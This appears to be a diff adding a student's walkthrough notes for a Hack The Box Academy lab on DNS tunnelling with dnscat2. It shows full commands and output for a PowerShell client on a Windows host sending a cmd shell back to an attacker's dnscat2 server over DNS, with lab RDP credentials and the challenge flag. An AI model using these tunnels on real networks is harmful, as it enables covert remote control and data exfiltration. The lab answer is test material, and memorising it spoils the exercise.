@@ -1,0 +1,100 @@
+Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted Command-&-Control (C&C or C2) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. 
+
+ When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.
+
+If dnscat2 is not already set up on our attack host, we can do so using the following commands:
+
+Host Machine Syntax: MJBUCKNER@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
+
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+
+We can then start the dnscat2 server by executing the dnscat2 file.
+
+Host Machine Syntax: MJBUCKNER@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+
+New window created: 0
+dnscat2> New window created: crypto-debug
+Welcome to dnscat2! Some documentation may be out of date.
+
+auto_attach => false
+history_size (for new windows) => 1000
+Security policy changed: All connections must be encrypted
+New window created: dns1
+Starting Dnscat2 DNS server on 10.10.14.18:53
+[domains = inlanefreight.local]...
+
+Assuming you have an authoritative DNS server, you can run
+the client anywhere with the following (--secret is optional):
+
+  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
+
+To talk directly to the server without a domain name, run:
+
+  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
+
+Of course, you have to figure out <server> yourself! Clients
+will connect directly on UDP port 53.
+
+After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use dnscat2-powershell, a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server.
+
+Cloning dnscat2-powershell to the Attack Host
+
+Syntax: MJBUCKNER@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
+
+Once the dnscat2.ps1 file is on the target we can import it and run associated cmd-lets.
+
+VICTIM MACHINE Syntax: PS C:\htb> Import-Module .\dnscat2.ps1
+
+After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.
+
+VICTIM MACHINE SYNTAX: PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
+
+We must use the pre-shared secret (-PreSharedSecret) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.
+
+Confirming Session Establishment
+
+New window created: 1
+Session 1 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+
+dnscat2>
+
+use ? or -h to list options 
+
+Interacting with the Established Session
+
+Syntax: dnscat2> window -i 1
+New window created: 1
+history_size (session) => 1000
+Session 1 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+This is a console session!
+
+That means that anything you type will be sent as-is to the
+client, and anything they type will be displayed as-is on the
+screen! If the client is executing a command and you don't
+see a prompt, try typing 'pwd' or something!
+
+To go back, type ctrl-z.
+
+Microsoft Windows [Version 10.0.18363.1801]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+exec (OFFICEMANAGER) 1>
+
+Challenge:  RDP to 10.129.131.64 with user "htb-student" and password "HTB_@cademy_stdnt!"
+
+Question 1 - Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer. - AC@tinth3Tunnel
+
+1) xfreerdp /v:10.129.131.64 /u:htb-student /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-1235531/Desktop
+2) Download all the git clones this module listed above
+3) make sure to copy dnscat.ps1 to the RDP'd session from sahred HTB-Desktop 
+4) on HOST MACHINE - sudo ruby dnscat2.rb --dns host=10.10.14.119,port=53,domain=inlanefreight.local --no-cache
+5) on RDp'd session on admin powershell run - Import-Module .\dnscat2.ps1
+6) in RDP'd SESSION: Start-Dnscat2 -DNSserver 10.10.14.119 -Domain inlanefreight.local -PreSharedSecret f8f1fca5a063eee0d882db7bc743599a -Exec cmd
+7) wait for connection on HOST MACHINE -> once connected type : window -i 2 
+8) in HOST MACHINE CONNECTED SESSION - type c:\Users\htb-student\Documents\flag.txt -> AC@tinth3Tunnel
+
